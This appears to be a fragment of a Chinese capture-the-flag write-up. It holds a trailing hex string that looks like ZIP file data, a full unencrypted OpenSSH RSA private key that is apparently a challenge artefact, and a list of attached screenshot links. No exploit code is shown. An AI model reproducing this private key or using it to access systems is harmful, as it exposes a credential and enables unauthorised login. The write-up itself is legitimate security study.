b000104e803000004e8030000504b050600000000010001004e000000e40700000000
```



```
-----BEGIN OPENSSH PRIVATE KEY-----
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
B6k0LmSeJY4/sAAAAGMTMzN3VwAQIDBAU=
-----END OPENSSH PRIVATE KEY-----
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1731890767.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/1-1731890767.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/2-1731890767.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/3-1731890768.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/5-1731890769.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/8-1731890771.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1731890773.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1731890773.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1731890775.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/3-1731890775.png)